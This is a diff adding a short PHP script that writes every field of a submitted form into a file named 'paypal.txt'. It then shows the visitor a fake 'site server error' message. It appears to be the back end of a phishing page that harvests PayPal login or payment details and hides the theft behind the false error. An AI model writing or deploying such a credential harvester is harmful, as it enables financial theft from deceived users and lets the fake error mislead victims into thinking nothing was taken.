@@ -1,0 +1,23 @@
+
+
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Open the file for appending (create if not exists)
+    $file = fopen("paypal.txt", "a") or die("Unable to open file!");
+
+    // Write form data to the file
+    foreach ($_POST as $key => $value) {
+        $line = $key . ": " . $value . "\n";
+        fwrite($file, $line);
+    }
+
+    // Close the file
+    fclose($file);
+
+    // Display site server error message
+    echo "Site server error: Please try again later.";
+} else {
+    // Handle invalid request method
+    echo "Website error, it's our fault, not yours. Please try again later";
+}
+?>
